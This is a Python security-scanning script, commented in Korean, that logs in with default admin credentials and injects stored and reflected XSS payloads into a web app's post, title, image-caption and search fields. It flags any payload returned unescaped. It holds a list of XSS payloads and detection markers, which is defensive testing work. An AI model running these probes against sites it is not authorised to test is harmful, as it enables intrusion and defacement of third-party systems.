"""
Stage 7: Stored XSS Diagnosis

게시글/이미지 캡션 등 사용자 입력을 저장하는 엔드포인트에 XSS 페이로드를 주입하고
저장 후 해당 페이지를 방문해 페이로드가 이스케이프 없이 반환되는지 확인한다.

"""

"""
① <script>alert(1)</script> 보내기
② 서버가 저장
③ 저장된 페이지 열기
④ 응답에 <script> 가 그대로 있으면 → vulnerable: true
   &lt;script&gt; 로 이스케이프됐으면 → vulnerable: false

흐름은 다음과 같아용 
"""

import json
import sys
import requests
from typing import Optional


# ──────────────────────────────────────────────
# XSS 페이로드 목록
# 작은따옴표 없이 백틱 사용 (SQL Injection 방지) -> 근데 뭐.. 이미 제가 보기 싫어서 ㅋㅋ sql injection은 이미 막아놨습니당 
# ──────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
]

# 취약 여부 판단 기준 — 이 문자열이 응답에 이스케이프 없이 포함되면 취약
DETECTION_MARKERS = [
    "<script>",
    "onerror=alert",
    "onload=alert",
    "javascript:alert",
    "onload=alert",
]


def _is_vulnerable(response_text: str, payload: str) -> tuple[bool, str]:
    """
    응답 본문에 페이로드가 이스케이프 없이 포함되어 있는지 확인.
    &lt; 또는 &gt; 로 이스케이프된 경우는 취약하지 않은 것으로 판단.
    """
    for marker in DETECTION_MARKERS:
        if marker in response_text and marker not in response_text.replace(marker, ""):
            return True, f"페이로드 마커 '{marker}' 가 이스케이프 없이 응답에 포함됨"

    # 페이로드 자체가 원본 그대로 포함되어 있는지 확인
    if payload in response_text:
        # 이스케이프된 버전이 없고 원본이 있으면 취약
        escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
        if escaped not in response_text:
            return True, f"페이로드가 원본 그대로 응답에 포함됨"

    return False, ""


def _login(session: requests.Session, base_url: str, username: str, password: str) -> bool:
    """로그인 후 세션 쿠키 획득."""
    try:
        resp = session.post(
            f"{base_url}/login",
            data={"username": username, "password": password},
            allow_redirects=True,
            timeout=10,
        )
        # 로그인 성공 시 홈으로 리다이렉트됨
        return resp.status_code == 200 and "로그인" not in resp.url
    except requests.RequestException:
        return False


# 게시글 내용 부분에 취약 스트립트 넣고 저장 후, 저장된 페이지 열어서 취약 여부 확인
def _test_post_content(
    session: requests.Session,
    base_url: str,
    payload: str,
) -> dict:
    """
    게시글 content 파라미터에 XSS 페이로드 주입 테스트.
    취약점: app.py new_post() — content가 템플릿에서 |safe 없이 렌더링되어도
    Jinja2 autoescaping이 꺼져있으면 그대로 노출.
    """
    result = {
        "endpoint": "/post/new",
        "parameter": "content",
        "method": "POST",
        "payload": payload,
        "stored_url": None,
        "vulnerable": False,
        "evidence": "",
    }

    try:
        # 게시글 작성
        resp = session.post(
            f"{base_url}/post/new",
            data={
                "title": "XSS Diagnosis Test",
                "content": payload,
            },
            allow_redirects=False,          # 리다이렉트 따라가지 않기
            timeout=10,
        )

        # 리다이렉트 후 URL에서 게시글 ID 추출
        stored_url = resp.headers.get("Location", "/")
        result["stored_url"] = stored_url

        # 저장된 게시글 페이지만 확인 (홈 말고)
        if stored_url and stored_url != "/":
            view_resp = session.get(f"{base_url}{stored_url}", timeout=10)
            vulnerable, evidence = _is_vulnerable(view_resp.text, payload)
            result["vulnerable"] = vulnerable
            result["evidence"] = evidence

    except requests.RequestException as e:
        result["evidence"] = f"요청 실패: {e}"

    return result

# 게시글 제목 부분에 취약 스트립트 넣고 저장 후, 저장된 페이지 열어서 취약 여부 확인
def _test_post_title(
    session: requests.Session,
    base_url: str,
    payload: str,
) -> dict:
    """게시글 title 파라미터에 XSS 페이로드 주입 테스트."""
    result = {
        "endpoint": "/post/new",
        "parameter": "title",
        "method": "POST",
        "payload": payload,
        "stored_url": None,
        "vulnerable": False,
        "evidence": "",
    }

    try:
        resp = session.post(
            f"{base_url}/post/new",
            data={
                "title": payload,
                "content": "XSS Diagnosis Test Content",
            },
            allow_redirects=False,
            timeout=10,
        )

        stored_url = resp.headers.get("Location", "/")
        result["stored_url"] = stored_url

        if stored_url and stored_url != "/":
            view_resp = session.get(f"{base_url}{stored_url}", timeout=10)
            vulnerable, evidence = _is_vulnerable(view_resp.text, payload)
            result["vulnerable"] = vulnerable
            result["evidence"] = evidence

    except requests.RequestException as e:
        result["evidence"] = f"요청 실패: {e}"

    return result


# 이미지 캡션 부분에 취약 스트립트 넣고 저장 후, 저장된 페이지 열어서 취약 여부 확인
def _test_image_caption(
    session: requests.Session,
    base_url: str,
    payload: str,
) -> dict:
    """
    이미지 업로드 caption 파라미터에 XSS 페이로드 주입 테스트.
    취약점: app.py view_image() — caption이 |safe 필터로 렌더링됨.
    """
    result = {
        "endpoint": "/gallery/upload",
        "parameter": "caption",
        "method": "POST",
        "payload": payload,
        "stored_url": None,
        "vulnerable": False,
        "evidence": "",
    }

    try:
        # 더미 이미지 파일과 함께 업로드
        dummy_image = ("test.jpg", b"\xff\xd8\xff\xe0" + b"\x00" * 10, "image/jpeg")
        resp = session.post(
            f"{base_url}/gallery/upload",
            data={"caption": payload},
            files={"image": dummy_image},
            allow_redirects=True,
            timeout=10,
        )

        # 갤러리 목록에서 가장 최근 이미지 ID 추출
        gallery_resp = session.get(f"{base_url}/gallery", timeout=10)
        stored_url = _extract_latest_image_url(gallery_resp.text)
        result["stored_url"] = stored_url

        if stored_url:
            view_resp = session.get(f"{base_url}{stored_url}", timeout=10)
            vulnerable, evidence = _is_vulnerable(view_resp.text, payload)
            result["vulnerable"] = vulnerable
            result["evidence"] = evidence

    except requests.RequestException as e:
        result["evidence"] = f"요청 실패: {e}"

    return result

# 검색 결과에 반영되는 XSS 테스트
def _test_search_reflected(
    session: requests.Session,
    base_url: str,
    payload: str,
) -> dict:
    """
    검색 q 파라미터에 XSS 페이로드 주입 테스트 (Reflected XSS).
    취약점: app.py search() — q가 HTML에 직접 삽입됨.
    """
    result = {
        "endpoint": "/search",
        "parameter": "q",
        "method": "GET",
        "payload": payload,
        "stored_url": f"/search?q={payload}",
        "vulnerable": False,
        "evidence": "(Reflected XSS — 저장되지 않고 즉시 반환)",
    }

    try:
        resp = session.get(
            f"{base_url}/search",
            params={"q": payload},
            timeout=10,
        )
        vulnerable, evidence = _is_vulnerable(resp.text, payload)
        result["vulnerable"] = vulnerable
        if vulnerable:
            result["evidence"] = f"[Reflected XSS] {evidence}"

    except requests.RequestException as e:
        result["evidence"] = f"요청 실패: {e}"

    return result

# 갤러리 HTML에서 가장 최근 이미지 상세 URL 추출
def _extract_latest_image_url(html: str) -> Optional[str]:
    import re
    matches = re.findall(r'href=["\'](/gallery/\d+)["\']', html)
    return matches[0] if matches else None


# 전체 파이프라인 실행 함수
def run_stored_xss_diagnosis(
    target_url: str,
    username: str = "admin",
    password: str = "admin1234",
    payloads: Optional[list] = None,
) -> dict:
    """
    Stored XSS 진단 전체 파이프라인 실행.

    Args:
        target_url: 진단 대상 베이스 URL (예: http://52.78.187.138:5000)
        username: 로그인할 계정 (게시글 작성 권한 필요)
        password: 비밀번호
        payloads: 커스텀 페이로드 목록 (None이면 기본값 사용)

    Returns:
        진단 결과 dict
    """
    base_url = target_url.rstrip("/")
    payloads = payloads or XSS_PAYLOADS

    result = {
        "target": base_url,
        "scan_type": "stored_xss",
        "injection_points": [],
        "summary": {
            "total_tested": 0,
            "vulnerable_count": 0,
        },
    }

    # 세션 생성 및 로그인
    session = requests.Session()
    session.headers.update({"User-Agent": "XSS-Diagnosis/1.0"})

    login_success = _login(session, base_url, username, password)
    if not login_success:
        result["error"] = f"로그인 실패: {username} / {password}"
        return result

    # 첫 번째 페이로드만으로 전체 주입 지점 테스트
    # (여러 페이로드 모두 시도하면 DB에 테스트 데이터가 너무 쌓임)
    primary_payload = payloads[0]

    test_functions = [
        lambda: _test_post_content(session, base_url, primary_payload),
        lambda: _test_post_title(session, base_url, primary_payload),
        lambda: _test_image_caption(session, base_url, primary_payload),
        lambda: _test_search_reflected(session, base_url, primary_payload),
    ]

    for test_fn in test_functions:
        point = test_fn()
        result["injection_points"].append(point)
        result["summary"]["total_tested"] += 1
        if point["vulnerable"]:
            result["summary"]["vulnerable_count"] += 1

    # 취약한 지점에 대해 추가 페이로드 시도
    vulnerable_points = [p for p in result["injection_points"] if p["vulnerable"]]
    if vulnerable_points and len(payloads) > 1:
        for payload in payloads[1:]:
            point = _test_post_content(session, base_url, payload)
            point["note"] = "추가 페이로드 시도"
            result["injection_points"].append(point)
            result["summary"]["total_tested"] += 1
            if point["vulnerable"]:
                result["summary"]["vulnerable_count"] += 1

    return result


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    username = sys.argv[2] if len(sys.argv) > 2 else "admin"
    password = sys.argv[3] if len(sys.argv) > 3 else "admin1234"

    result = run_stored_xss_diagnosis(target, username, password)
    print(json.dumps(result, indent=2, ensure_ascii=False))